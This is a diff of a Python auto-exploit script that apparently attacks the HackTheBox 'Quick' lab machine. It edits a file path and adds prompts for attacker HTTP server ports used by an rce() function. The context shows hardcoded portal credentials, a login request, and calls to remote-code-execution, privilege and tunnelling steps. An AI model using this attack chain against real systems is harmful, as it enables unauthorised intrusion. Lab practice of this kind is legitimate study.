@@ -11,7 +11,7 @@ from pexpect import pxssh
 
 from termcolor import colored
 
-http_client = "/home/script/Desktop/quick/quiche/target/debug/examples/http3-client \"https://printerv2.quick.htb/docs/Connectivity.pdf\" > script1337.pdf"
+http_client = "/home/NoBody/Desktop/quick/quiche/target/debug/examples/http3-client \"https://printerv2.quick.htb/docs/Connectivity.pdf\" > script1337.pdf"
 
 header = {
     'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0',
@@ -270,13 +270,15 @@ how to use:
 """, "yellow"))
     log("Your Ip :" + get_ip_address())
     log("Target ip 10.10.10.186")
+    port1 = input("Enter the simplehttpserver first port here : ")
+    port2 = input("Enter the simplehttpserver second port here : ")
     log("Starting Attack...")
     potal_web = "http://10.10.10.186:9001/login.php"
     # os.system(http_client)
     data = "email=elisa@wink.co.uk&password=Quick4cc3$$"
     log("Logging into web protal")
     s.post(potal_web, data, headers=header)
-    rce()
+    rce(port1,port2)
     fetchsrvadm()
     create_tunnel()
     log("Waiting for 10s for No fucking reason")
@@ -290,5 +292,3 @@ how to use:
 
 
 getuser()
-
-#demo : https://www.youtube.com/watch?v=LP55HTuEafQ
